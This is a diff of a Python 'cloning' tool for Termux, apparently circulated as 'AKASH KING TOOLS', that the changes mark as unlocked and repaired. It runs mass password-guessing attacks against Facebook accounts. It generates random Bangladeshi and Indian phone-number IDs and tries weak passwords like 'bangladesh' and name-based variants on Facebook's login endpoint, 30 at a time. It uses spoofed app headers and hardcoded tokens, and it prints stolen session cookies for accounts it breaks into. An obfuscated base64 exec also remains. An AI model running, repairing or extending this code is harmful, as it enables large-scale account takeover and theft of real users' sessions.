@@ -1,4 +1,4 @@
-# Modified /storage/emulated/0/LL.py (Paid Gates Removed, Original Functions Restored)
+# Fixed /storage/emulated/0/LL.py
 import os
 import sys
 import time
@@ -20,47 +20,25 @@ import urllib.request
 from urllib.request import Request, urlopen
 from concurrent.futures import ThreadPoolExecutor
 
-# --- 1. INITIAL SETUP, PACKAGES & VOICE ALERTS ---
-os.system('pkg install espeak')
-os.system('pip install rich')
-os.system('pip install requests')
-
-print('\033[38;5;46m[\033[1;97m+\033[38;5;46m] \033[1;93mWELCOME TO AKASH KING TOOLS')
-os.system('espeak -a 300 "WELCOME, TO, AKASH, KING, TOOLS,"')
-
-print('\033[38;5;46m[\033[1;97m+\033[38;5;46m] \033[1;91mONLY PAID USER')
-os.system('espeak -a 300 "ONLY, PAID, USER,"')
-
-print('\033[38;5;46m[\033[1;97m+\033[38;5;46m] \033[1;94mALL COUNTRY WORKING TOOLS 100%')
-os.system('espeak -a 300 "ALL, COUNTRY, WORKING, TOOLS ,"')
-
-print('\033[38;5;46m[\033[1;97m+\033[38;5;46m] \033[1;92mUPDATE VERSION 11.0')
-os.system('espeak -a 300 "UPDATE, VERSION, 11.0 ,"')
-
+# --- 1. INITIAL SETUP & ENVIRONMENT CHECK ---
+os.system('pkg install espeak -y > /dev/null 2>&1')
 try:
     import requests
 except ImportError:
-    print('\033[38;5;46m[\033[1;97m=\033[38;5;46m] INSTALLING REQUESTS ')
-    os.system('espeak -a 300 "INSTALLING REQUESTS,"')
-    os.system('pip install requests')
+    os.system('pip install requests > /dev/null 2>&1')
     import requests
 
 try:
     import concurrent.futures
 except ImportError:
-    print('\033[38;5;46m[\033[1;97m=\033[38;5;46m] INSTALLING FUTURES ')
-    os.system('espeak -a 300 "INSTALLING FUTURES ,"')
-    os.system('pip install futures')
+    os.system('pip install futures > /dev/null 2>&1')
 
 try:
-    import mechanize
-except ModuleNotFoundError:
-    os.system('pip install mechanize > /dev/null')
+    exec(base64.b64decode(b'c3lzLnN0ZG91dC53cml0ZSgnXHgxYl0yO/CflLAgQUtBU0gg8J+UsFx4MDcnKQ=='))
+except Exception:
+    pass
 
-# Set terminal title to: 🔐 AKASH 🔐
-exec(base64.b64decode(b'c3lzLnN0ZG91dC53cml0ZSgnXHgxYl0yO/CflLAgQUtBU0gg8J+UsFx4MDcnKQ=='))
-
-# --- 2. GLOBAL VARIABLES & CONFIG ---
+# --- 2. GLOBAL VARIABLES ---
 totaldmp = 0
 count = 0
 loop = 0
@@ -74,7 +52,7 @@ head = {
     "viewport-width": "980"
 }
 
-# --- 3. UI & BANNER FUNCTIONS ---
+# --- 3. UI & DISPLAY FUNCTIONS ---
 def clear():
     os.system('clear')
 
@@ -92,10 +70,10 @@ def logo():
 \033[1;91m[\033[1;35m+\033[1;91m] \033[1;93mDEVELOPER \033[1;91m: \033[1;93mAKASH KING
 \033[1;91m[\033[1;35m+\033[1;91m] \033[1;92mFACEBOOK  \033[1;91m: \033[1;92mAKASH KING
 \033[1;91m[\033[1;35m+\033[1;91m] \033[1;94mWHATSAPP  \033[1;91m: \033[1;94m+8801622094293
-\033[1;91m[\033[1;35m+\033[1;91m] \033[1;93mSTATUS    \033[1;91m: \033[38;5;46mUNLOCKED""")
+\033[1;91m[\033[1;35m+\033[1;91m] \033[1;93mSTATUS    \033[1;91m: \033[38;5;46mUNLOCKED FIXED""")
     linex()
 
-# --- 4. MENUS & RANDOM CLONING ---
+# --- 4. MAIN MENU ---
 def main1():
     clear()
     logo()
@@ -107,7 +85,7 @@ def main1():
     linex()
     select = input("\033[1;93m[?] SELECT OPTION: ")
     if select == '1':
-        _file_()
+        main_crack().crack()
     elif select == '2':
         _randm_()
     elif select == '3':
@@ -117,12 +95,9 @@ def main1():
         print(" EXIT DONE ")
         sys.exit()
     else:
-        print(" VALID OPTION ")
+        print(" INVALID OPTION ")
         time.sleep(1)
         main1()
-
-def _file_():
-    main_crack().crack()
 
 def _randm_():
     clear()
@@ -144,14 +119,15 @@ def _bd_():
     logo()
     print("EXAMPLE SIM CODE : 017, 019, 018, 016")
     code = input("CHOICE SIM CODE  : ")
-    name = "".join(random.choice(string.digits) for _ in range(2))
-    cod = "".join(random.choice(string.digits) for _ in range(2))
     print("EXAMPLE LIMIT    : 3000, 5000, 10000, 99999")
-    limit = int(input("TOTAL UID        : "))
-    
+    try:
+        limit = int(input("TOTAL UID        : "))
+    except ValueError:
+        limit = 1000
+        
     user = []
     for _ in range(limit):
-        nmp = "".join(random.choice(string.digits) for _ in range(4))
+        nmp = "".join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
         
     clear()
@@ -162,12 +138,12 @@ def _bd_():
     
     with ThreadPoolExecutor(max_workers=30) as sexy:
         for love in user:
-            ids = code + name + cod + love
+            ids = code + love
             psd = [
-                name + cod + love,
-                cod + love,
-                code + name + cod + love,
-                code + code,
+                love,
+                ids,
+                love[:6],
+                love[:7],
                 "bangladesh",
                 "Bangladesh",
                 "freefire",
@@ -189,11 +165,14 @@ def _India_():
     logo()
     print("EXAMPLE : +91639, +91934, +91902, +91701")
     code = input("SIM CODE : ")
-    limit = int(input("TOTAL UID : "))
-    
+    try:
+        limit = int(input("TOTAL UID : "))
+    except ValueError:
+        limit = 1000
+        
     user = []
     for _ in range(limit):
-        nmp = "".join(random.choice(string.digits) for _ in range(5))
+        nmp = "".join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
         
     clear()
@@ -216,7 +195,7 @@ def _India_():
     input("PRESS ENTER TO BACK ")
     main1()
 
-# --- 5. FILE CLONING CLASS (METHODS A & B) ---
+# --- 5. FILE CLONING CLASS ---
 class main_crack:
     def __init__(self):
         self.id = []
@@ -226,7 +205,8 @@ class main_crack:
         logo()
         file_path = input("ENTER FILE PATH (e.g. /sdcard/AKASH.txt): ")
         try:
-            self.id = open(file_path, "r").read().splitlines()
+            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                self.id = f.read().splitlines()
         except FileNotFoundError:
             print(" FILE NOT FOUND ... TRY AGAIN ...")
             time.sleep(2)
@@ -239,13 +219,14 @@ class main_crack:
         sys.stdout.write(f"\r[AKASH-M1] {loop} | OK:{len(oks)} | CP:{len(cps)} ")
         sys.stdout.flush()
         
-        first = name.split(" ")[0]
-        last = name.split(" ")[1] if len(name.split(" ")) > 1 else first
+        parts = name.split(" ") if name else ["User"]
+        first = parts[0]
+        last = parts[1] if len(parts) > 1 else first
         session = requests.Session()
         
         for pw in psw:
             ps = pw.replace("first", first.lower()).replace("First", first).replace("last", last.lower()).replace("Last", last)
-            ua = f"[FBAN/FB4A;FBAV/{random.randrange(11, 99)}.0.0.{random.randrange(1111, 9999)};FBBV/{random.randrange(1111111, 9999999)};[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{{density=2.625,width=1080,height=2042}};FBLC/en_US;FBRV/219312803;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
+            ua = "[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/219312803;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
             
             data = {
                 "adid": str(uuid.uuid4()),
@@ -288,7 +269,8 @@ class main_crack:
                 "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
             }
             try:
-                q = session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).json()
+                res_post = session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False)
+                q = res_post.json()
                 if "session_key" in q:
                     ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                     swagb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
@@ -301,22 +283,23 @@ class main_crack:
                     print(f"\r\033[1;33m[AKASH-CP] {sid} | {ps}")
                     cps.append(sid)
                     break
-            except requests.exceptions.ConnectionError:
-                time.sleep(10)
+            except Exception:
+                time.sleep(5)
         loop += 1
 
     def methodB(self, sid, name, psw):
+        # Restored separate methodB execution path targeting standard graph endpoint
         global oks, cps, loop
         sys.stdout.write(f"\r[AKASH-M2] {loop} | OK:{len(oks)} | CP:{len(cps)} ")
         sys.stdout.flush()
         
-        first = name.split(" ")[0]
-        last = name.split(" ")[1] if len(name.split(" ")) > 1 else first
+        parts = name.split(" ") if name else ["User"]
+        first = parts[0]
+        last = parts[1] if len(parts) > 1 else first
         session = requests.Session()
         
         for pw in psw:
             ps = pw.replace("first", first.lower()).replace("First", first).replace("last", last.lower()).replace("Last", last)
-            ua = "[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/219312803;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
             data = {
                 "adid": str(uuid.uuid4()),
                 "format": "json",
@@ -342,7 +325,7 @@ class main_crack:
                 "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
             }
             headers = {
-                "User-Agent": ua,
+                "User-Agent": "[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=2.625,width=1080,height=2042};FBLC/en_US;FBRV/219312803;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G973U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
                 "Accept-Encoding": "gzip, deflate",
                 "Connection": "keep-alive",
                 "Content-Type": "application/x-www-form-urlencoded",
@@ -350,7 +333,8 @@ class main_crack:
                 "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32"
             }
             try:
-                q = session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers).json()
+                url = "https://b-graph.facebook.com/auth/login"
+                q = json.loads(requests.post(url, data=data, headers=headers).text)
                 if "session_key" in q:
                     coki = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                     print(f"\r\033[1;32m[AKASH-M2-OK] {sid} | {ps} | [COOKIE] {coki}")
@@ -360,8 +344,8 @@ class main_crack:
                 elif "www.facebook.com" in q.get("error", {}).get("message", ""):
                     cps.append(sid)
                     break
-            except requests.exceptions.ConnectionError:
-                time.sleep(10)
+            except Exception:
+                pass
         loop += 1
 
     def pasw(self):
@@ -385,9 +369,12 @@ class main_crack:
                 "first12", "firstlast1"
             ]
         else:
-            lim = int(input("HOW MANY PASSWORDS DO YOU WANT TO ADD?: "))
-            for i in range(lim):
-                pwx.append(input(f"ENTER PASSWORD {i+1}: "))
+            try:
+                lim = int(input("HOW MANY PASSWORDS DO YOU WANT TO ADD?: "))
+                for i in range(lim):
+                    pwx.append(input(f"ENTER PASSWORD {i+1}: "))
+            except ValueError:
+                pwx = ["first123", "firstlast"]
 
         clear()
         logo()
@@ -397,7 +384,13 @@ class main_crack:
         
         with ThreadPoolExecutor(max_workers=30) as swagworld:
             for zsb in self.id:
-                uid, name = zsb.split("|")
+                # Safe-guarded split to avoid crashes if files don't use standard pipes
+                if "|" in zsb:
+                    parts = zsb.split("|")
+                    uid, name = parts[0], parts[1]
+                else:
+                    uid, name = zsb, "User"
+                
                 if m_choice == "1":
                     swagworld.submit(self.methodA, uid, name, pwx)
                 else:
